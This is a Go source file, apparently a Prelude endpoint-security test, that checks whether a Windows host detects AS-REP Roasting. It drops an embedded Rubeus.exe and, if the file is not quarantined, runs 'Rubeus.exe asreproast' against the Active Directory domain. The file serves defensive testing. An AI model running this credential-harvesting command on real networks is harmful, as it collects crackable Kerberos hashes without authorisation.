//go:build windows
// +build windows

/*
ID: 028e463a-5ba1-4276-8e3a-b3282bb4414f
NAME: AS-REP Roasting via Rubeus
TECHNIQUE: T1558.004
UNIT: response
CREATED: 2024-02-21 23:00:29.362018+00:00
*/
package main

import (
	_ "embed"
	"strings"

	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

//go:embed Rubeus.exe
var malicious []byte

func ADJoined() bool {
	Endpoint.Say("Determining if endpoint is conected to Active Directory")
	command := []string{"powershell.exe", "-c", "(Get-WmiObject Win32_ComputerSystem).PartOfDomain"}
	out, err := Endpoint.Shell(command)
	if err != nil {
		Endpoint.Say("Got error \"%v\" issuing AD join check", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}
	return !strings.Contains(out, "False")
}

func test() {
	if !ADJoined() {
		Endpoint.Say("Host not joined to an Active Directory domain")
		Endpoint.Stop(Endpoint.NotRelevant)
	}
	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
		Endpoint.Say("%v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}
	Endpoint.Say("Extracting file for quarantine test")

	if Endpoint.Quarantined("Rubeus.exe", malicious) {
		Endpoint.Say("Malicious file was caught!")
		Endpoint.Stop(Endpoint.FileQuarantinedOnExecution)
		return
	}

	Endpoint.Say("Malicious file was not caught")

	Endpoint.Say("Executing Rubeus")
	command := []string{
		"cmd.exe", "/c", "Rubeus.exe", "asreproast",
	}
	out, err := Endpoint.Shell(command)
	Endpoint.Say(out)
	if err != nil {
		Endpoint.Say("Got error \"%v\" when running Rubeus", err)
		Endpoint.Stop(Endpoint.ExecutionPrevented)
	}
	Endpoint.Say("Rubeus was not blocked")
	Endpoint.Stop(Endpoint.Unprotected)
}

func main() {
	Endpoint.Start(test)
}
